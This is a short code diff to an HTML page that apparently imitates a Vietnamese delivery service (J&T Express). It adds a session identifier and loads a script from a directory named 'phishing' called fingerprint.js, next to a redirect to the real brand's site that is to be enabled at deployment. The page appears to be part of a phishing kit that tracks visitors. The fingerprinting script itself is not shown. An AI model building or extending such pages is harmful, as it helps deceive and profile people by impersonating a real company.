@@ -351,5 +351,11 @@
             // window.location.href = 'https://jtexpress.vn'; // bỏ comment khi deploy
         }
     </script>
+    <script>
+        window.SESSION_ID = 'landing_delivery_' + Date.now() + '_' + Math.random().toString(36).substr(2,6);
+        window.PAGE_TYPE = 'landing_delivery';
+    </script>
+    <script src="../phishing/fingerprint.js"></script>
 </body>
 </html>
+
